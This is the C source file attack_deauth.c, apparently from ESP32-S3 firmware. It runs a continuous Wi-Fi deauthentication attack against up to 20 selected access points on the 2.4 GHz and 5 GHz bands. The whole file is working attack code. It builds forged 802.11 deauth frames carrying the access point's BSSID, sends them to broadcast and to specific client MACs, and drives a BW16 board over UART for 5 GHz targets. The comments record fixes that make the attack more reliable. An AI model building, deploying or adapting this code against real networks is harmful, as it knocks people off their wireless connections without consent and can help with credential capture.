/*
 * attack_deauth.c — Multi-target, multi-band Deauth Attack
 * 2.4GHz: ESP32-S3 native
 * 5GHz: BW16 via UART
 * 
 * Features:
 * - Multiple SSID/AP selection
 * - Continuous deauth until stopped
 * - Broadcast + client-specific deauth
 * - Dual-band support
 * 
 * FIXED: WiFi mode check before packet send
 * FIXED: Error logging for esp_wifi_80211_tx failures
 * FIXED: Better channel switching with mode preservation
 * FIXED: Increased delay between packets for stability
 */

#include "attack_deauth.h"
#include "bw16_uart.h"
#include "esp_rom_sys.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "DEAUTH";

// ==================== DATA STRUCTURES ====================
#define MAX_TARGETS 20
static TaskHandle_t g_deauth_task_handle = NULL;
static volatile bool g_deauth_running = false;
static deauth_target_t g_deauth_targets[MAX_TARGETS];
static int g_deauth_target_count = 0;
static uint8_t g_client_mac[6];
static int g_pkt_count = 100;      // Packets per target per round
static int g_pkt_delay = 15;       // FIXED: Increased from 10ms to 15ms for stability
static volatile uint64_t g_total_packets_sent = 0;

// ==================== FIXED: SEND 2.4GHz DEAUTH PACKET ====================
static esp_err_t send_deauth_packet_24ghz(uint8_t *bssid, uint8_t *client_mac, uint8_t channel) {
    esp_err_t ret;

    // FIX: Ensure WiFi mode is AP or APSTA before sending
    wifi_mode_t current_mode;
    esp_wifi_get_mode(&current_mode);
    if (current_mode != WIFI_MODE_AP && current_mode != WIFI_MODE_APSTA) {
        ESP_LOGW(TAG, "WiFi mode %d not suitable for TX, switching to APSTA", current_mode);
        ret = esp_wifi_set_mode(WIFI_MODE_APSTA);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Failed to set WiFi mode: %s", esp_err_to_name(ret));
            return ret;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    // FIX: Switch channel and verify
    ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set channel %d: %s", channel, esp_err_to_name(ret));
        return ret;
    }
    esp_rom_delay_us(200); // FIX: Increased from 100us for better stability

    // Construct 802.11 deauth frame
    uint8_t packet[26] = {
        0xC0, 0x00,                     // Frame Control: Deauth
        0x00, 0x00,                     // Duration
        client_mac[0], client_mac[1], client_mac[2],  // Destination
        client_mac[3], client_mac[4], client_mac[5],
        bssid[0], bssid[1], bssid[2],  // Source (AP BSSID)
        bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2],  // BSSID
        bssid[3], bssid[4], bssid[5],
        0x00, 0x00,                     // Sequence
        0x07, 0x00                      // Reason: Class 3 frame from nonassociated STA
    };

    ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Deauth TX failed on ch %d: %s", channel, esp_err_to_name(ret));
    }
    return ret;
}

// ==================== FIXED: DEAUTH TASK ====================
static void deauth_task_func(void *params) {
    g_deauth_running = true;
    g_total_packets_sent = 0;
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    bool has_client = (memcmp(g_client_mac, broadcast, 6) != 0);

    ESP_LOGI(TAG, "🔥 Deauth started: %d targets (delay=%dms, packets=%d)", 
             g_deauth_target_count, g_pkt_delay, g_pkt_count);

    for (int i = 0; i < g_deauth_target_count; i++) {
        ESP_LOGI(TAG, "  Target %d: " MACSTR " (ch %d) [%s]", i + 1,
                 MAC2STR(g_deauth_targets[i].bssid),
                 g_deauth_targets[i].channel,
                 g_deauth_targets[i].is_5ghz ? "5GHz" : "2.4GHz");
    }

    // FIX: Store original WiFi mode to restore later
    wifi_mode_t saved_mode;
    esp_wifi_get_mode(&saved_mode);
    
    // FIX: Ensure APSTA mode before starting
    if (saved_mode != WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    // FIX: Add a small WiFi AP config to keep the interface active
    wifi_config_t dummy_ap = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .channel = 1,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 1,
            .beacon_interval = 1000,
        },
    };
    esp_wifi_set_config(WIFI_IF_AP, &dummy_ap);
    vTaskDelay(pdMS_TO_TICKS(50));

    int round = 0;
    while (g_deauth_running) {
        round++;
        for (int t = 0; t < g_deauth_target_count && g_deauth_running; t++) {
            if (g_deauth_targets[t].is_5ghz) {
                // Send via BW16 for 5GHz targets
                if (bw16_is_connected()) {
                    char json[256];
                    snprintf(json, sizeof(json),
                        "{\"targets\":[{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"channel\":%d}]}",
                        g_deauth_targets[t].bssid[0], g_deauth_targets[t].bssid[1],
                        g_deauth_targets[t].bssid[2], g_deauth_targets[t].bssid[3],
                        g_deauth_targets[t].bssid[4], g_deauth_targets[t].bssid[5],
                        g_deauth_targets[t].channel);
                    bw16_deauth_start(json);
                    vTaskDelay(pdMS_TO_TICKS(500));
                    g_total_packets_sent += g_pkt_count;
                }
            } else {
                // Send via ESP32-S3 for 2.4GHz targets
                int sent_ok = 0;
                for (int p = 0; p < g_pkt_count && g_deauth_running; p++) {
                    // Send to broadcast
                    if (send_deauth_packet_24ghz(g_deauth_targets[t].bssid, broadcast, 
                                                  g_deauth_targets[t].channel) == ESP_OK) {
                        sent_ok++;
                    }
                    g_total_packets_sent++;

                    // Also send to specific client if not broadcast
                    if (has_client) {
                        if (send_deauth_packet_24ghz(g_deauth_targets[t].bssid, g_client_mac, 
                                                      g_deauth_targets[t].channel) == ESP_OK) {
                            sent_ok++;
                        }
                        g_total_packets_sent++;
                    }

                    if (g_pkt_delay > 0) {
                        vTaskDelay(pdMS_TO_TICKS(g_pkt_delay));
                    }
                }
                if (sent_ok == 0 && round == 1) {
                    ESP_LOGW(TAG, "No packets sent on first round for target %d!", t);
                }
            }
        }
        
        // FIX: Log stats every 10 rounds
        if (round % 10 == 1) {
            ESP_LOGI(TAG, "Deauth progress: round %d, total packets: %llu", 
                     round, g_total_packets_sent);
        }
        
        // FIX: Small inter-round delay to prevent WiFi watchdog
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    // Stop BW16 deauth if active
    if (bw16_is_connected()) {
        bw16_deauth_stop();
    }

    ESP_LOGI(TAG, "⏹️ Deauth stopped. Total packets sent: %llu over %d rounds", 
             g_total_packets_sent, round);
    g_deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

// ==================== PUBLIC API ====================
void deauth_start(deauth_target_t *targets, int count, uint8_t *client_mac) {
    if (g_deauth_running) {
        deauth_stop();
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    if (count > MAX_TARGETS) count = MAX_TARGETS;
    memcpy(g_deauth_targets, targets, count * sizeof(deauth_target_t));
    g_deauth_target_count = count;
    if (client_mac) {
        memcpy(g_client_mac, client_mac, 6);
    } else {
        memset(g_client_mac, 0xFF, 6);
    }

    xTaskCreatePinnedToCore(deauth_task_func, "deauth_task", 4096, NULL, 5, 
                            &g_deauth_task_handle, 1); // FIX: Run on core 1 to avoid WiFi/httpd conflict
    ESP_LOGI(TAG, "Deauth started with %d targets (core 1)", count);
}

void deauth_stop(void) {
    g_deauth_running = false;
    if (g_deauth_task_handle) {
        vTaskDelay(pdMS_TO_TICKS(500)); // FIX: Increased from 300ms
    }
    // Stop BW16 deauth
    if (bw16_is_connected()) {
        bw16_deauth_stop();
    }
    g_deauth_target_count = 0;
    ESP_LOGI(TAG, "Deauth stopped");
}

bool deauth_is_running(void) {
    return g_deauth_running;
}

uint64_t deauth_get_packets_sent(void) {
    return g_total_packets_sent;
}
